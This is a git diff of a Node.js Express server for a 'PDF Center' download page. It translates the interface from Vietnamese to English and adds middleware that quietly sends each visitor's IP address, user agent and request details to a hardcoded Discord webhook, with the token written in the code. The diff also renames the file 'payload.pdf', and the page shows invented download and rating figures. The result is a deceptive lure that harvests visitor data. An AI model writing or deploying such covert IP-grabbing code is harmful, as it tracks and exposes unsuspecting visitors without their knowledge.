@@ -1,9 +1,105 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
+const https = require('https');
+const http = require('http');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+
+// Discord webhook URL
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1382251782134173737/NQDrX9mI9YtCc12Xc0zPdmwVzoiW_WhxLA1CODlWdYLBhqbo2-CTjZJ_D8yeqYbsIl8M';
+
+// Function to get real IP address
+function getRealIP(req) {
+  return req.headers['x-forwarded-for'] || 
+         req.headers['x-real-ip'] || 
+         req.connection.remoteAddress || 
+         req.socket.remoteAddress ||
+         (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
+         req.ip;
+}
+
+// Function to send Discord webhook
+async function sendDiscordWebhook(message) {
+  return new Promise((resolve, reject) => {
+    const data = JSON.stringify({
+      content: message,
+      username: 'Railway PDF Server',
+      avatar_url: 'https://cdn.discordapp.com/emojis/1234567890123456789.png'
+    });
+
+    const url = new URL(DISCORD_WEBHOOK_URL);
+    const options = {
+      hostname: url.hostname,
+      port: 443,
+      path: url.pathname + url.search,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(data)
+      }
+    };
+
+    const req = https.request(options, (res) => {
+      let body = '';
+      res.on('data', (chunk) => body += chunk);
+      res.on('end', () => {
+        if (res.statusCode >= 200 && res.statusCode < 300) {
+          resolve(body);
+        } else {
+          reject(new Error(`Discord webhook failed: ${res.statusCode}`));
+        }
+      });
+    });
+
+    req.on('error', reject);
+    req.write(data);
+    req.end();
+  });
+}
+
+// Middleware to log connections
+app.use(async (req, res, next) => {
+  const ip = getRealIP(req);
+  const userAgent = req.headers['user-agent'] || 'Unknown';
+  const hostname = req.hostname || 'Unknown';
+  const method = req.method;
+  const url = req.url;
+  const timestamp = new Date().toLocaleString('en-US', {
+    timeZone: 'Asia/Ho_Chi_Minh'
+  });
+
+  // Only log for main routes, not static files
+  if (req.url === '/' || req.url === '/download') {
+    try {
+      // Send simple notification first
+      await sendDiscordWebhook(`🌐 **New connection**: ${ip}`);
+      
+      // Send detailed information
+      const detailedMessage = `
+📊 **Detailed Connection Info**
+🌍 **IP Address**: ${ip}
+🖥️ **User Agent**: ${userAgent}
+🏠 **Hostname**: ${hostname}
+📝 **Method**: ${method}
+🔗 **URL**: ${url}
+⏰ **Time**: ${timestamp}
+📍 **Location**: Vietnam
+─────────────────────────────
+      `.trim();
+      
+      setTimeout(() => {
+        sendDiscordWebhook(detailedMessage);
+      }, 1000);
+      
+    } catch (error) {
+      console.error('Discord webhook error:', error);
+    }
+  }
+  
+  next();
+});
 
 // Serve static files
 app.use(express.static('public'));
@@ -12,7 +108,7 @@ app.use(express.static('public'));
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
-    <html lang="vi">
+    <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -213,35 +309,35 @@ app.get('/', (req, res) => {
     <body>
         <div class="container">
             <h1>📄 PDF Center</h1>
-            <p>Tải xuống tài liệu PDF chất lượng cao với thiết kế hiện đại và trải nghiệm người dùng tuyệt vời.</p>
+            <p>Download high-quality PDF documents with modern design and excellent user experience.</p>
             
             <div class="file-info">
-                <h3>Thông tin tệp tin</h3>
+                <h3>File Information</h3>
                 <ul>
-                    <li>Định dạng: PDF</li>
-                    <li>Kích thước: 2.5 MB</li>
-                    <li>Trang: 45 trang</li>
-                    <li>Chất lượng: HD</li>
+                    <li>Format: PDF</li>
+                    <li>Size: 2.5 MB</li>
+                    <li>Pages: 45 pages</li>
+                    <li>Quality: HD</li>
                 </ul>
             </div>
             
             <a href="/download" class="download-btn">
                 <span class="pdf-icon">📥</span>
-                Tải xuống PDF
+                Download PDF
             </a>
             
             <div class="stats">
                 <div class="stat-item">
                     <span class="stat-number">1,234</span>
-                    <div class="stat-label">Lượt tải</div>
+                    <div class="stat-label">Downloads</div>
                 </div>
                 <div class="stat-item">
                     <span class="stat-number">4.9</span>
-                    <div class="stat-label">Đánh giá</div>
+                    <div class="stat-label">Rating</div>
                 </div>
                 <div class="stat-item">
                     <span class="stat-number">99%</span>
-                    <div class="stat-label">Hài lòng</div>
+                    <div class="stat-label">Satisfied</div>
                 </div>
             </div>
         </div>
@@ -294,7 +390,7 @@ app.get('/', (req, res) => {
                 
                 // Change button text during download
                 const originalText = this.innerHTML;
-                this.innerHTML = '<span class="pdf-icon">⏳</span> Đang tải...';
+                this.innerHTML = '<span class="pdf-icon">⏳</span> Loading...';
                 this.style.pointerEvents = 'none';
                 
                 setTimeout(() => {
@@ -313,8 +409,17 @@ app.get('/', (req, res) => {
 });
 
 // Download route
-app.get('/download', (req, res) => {
+app.get('/download', async (req, res) => {
   try {
+    const ip = getRealIP(req);
+    
+    // Send download notification to Discord
+    try {
+      await sendDiscordWebhook(`📥 **PDF Downloaded** by IP: ${ip}`);
+    } catch (discordError) {
+      console.error('Discord notification failed:', discordError);
+    }
+    
     // Create a sample PDF content (you can replace this with actual PDF generation)
     const pdfContent = `%PDF-1.4
 1 0 obj
@@ -391,7 +496,7 @@ startxref
     res.send(pdfContent);
   } catch (error) {
     console.error('Download error:', error);
-    res.status(500).send('Lỗi khi tải file PDF');
+    res.status(500).send('Error downloading PDF file');
   }
 });
 
@@ -407,7 +512,7 @@ app.get('/health', (req, res) => {
 // API endpoint for file info
 app.get('/api/file-info', (req, res) => {
   res.json({
-    filename: 'railway-document.pdf',
+    filename: 'payload.pdf',
     size: '2.5 MB',
     pages: 45,
     format: 'PDF',
@@ -436,9 +541,9 @@ app.use('*', (req, res) => {
         </style>
       </head>
       <body>
-        <h1>404 - Trang không tồn tại</h1>
-        <p>Trang bạn tìm kiếm không tồn tại.</p>
-        <a href="/">← Quay lại trang chủ</a>
+        <h1>404 - Page Not Found</h1>
+        <p>The page you are looking for does not exist.</p>
+        <a href="/">← Back to Home</a>
       </body>
     </html>
   `);
